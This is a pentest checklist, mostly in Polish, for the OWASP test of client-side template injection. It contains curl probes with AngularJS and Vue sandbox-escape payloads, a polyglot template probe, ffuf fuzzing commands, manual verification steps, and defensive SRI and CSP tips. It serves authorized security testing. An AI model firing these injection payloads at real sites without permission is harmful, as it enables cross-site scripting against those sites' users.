# WSTG-CLNT-15 — Testing for Client-side Template Injection (CSTI)

## Cele

- Identify the client-side framework and its version
- Detect injection points where user input is reflected into DOM and processed by template engine
- Assess if injection allows arbitrary JavaScript execution (XSS)

## KOMENDY

### Identyfikacja frameworka

```bash
curl -s "https://TARGET/" | grep -i "angular\|vue\|react\|ember\|knockout\|handlebars"

```

### Testowanie CSTI - Angular

```bash
curl -s "https://TARGET/page?input={{constructor.constructor('alert(1)')()**}}"
curl -s "https://TARGET/page?input={{7*7}}" | grep "49"

```

### Vue.js

```bash
curl -s "https://TARGET/page?input={{_c.constructor('alert(1)')()}}"

```

### Testowanie polyglot CSTI

```bash
curl -s "https://TARGET/page?input=\${7*7}{{7*7}}<%= 7*7 %>"

```

## KOMENDY Z WORDLISTAMI

### SecLists template engines

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/template-engines-expression.txt -mc all -o output_ffuf_csti.json

ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/template-engines-special-vars.txt -mc all -o output_ffuf_csti_vars.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj framework JS i jego wersje (Wappalyzer, whatweb)
2. Wstaw {{7*7}} i sprawdz czy wynik to 49 w przegladarce
3. Testuj payloady specyficzne dla frameworka (Angular, Vue)
4. Sprawdz CSP - CSTI wymaga unsafe-eval do eksploitacji w nowszych frameworkach
5. Testuj sandbox bypass dla danej wersji frameworka


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Third_Party_Javascript_Management_Cheat_Sheet.md

- Uzywaj atrybutu integrity (SRI) na tagach script i link dla zasobow third-party
- Pinuj wersje zasobow third-party — nie uzywaj latest/dynamic URL
- Wdroz CSP aby wymusic SRI (`require-sri-for script style`)
- Monitoruj zmiany w zasobach third-party — wykrywaj supply chain attacks

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SRI Check | Wykrywanie brakujacych atrybutow Subresource Integrity | [GitHub](https://github.com/SolomonSklash/sri-check) |
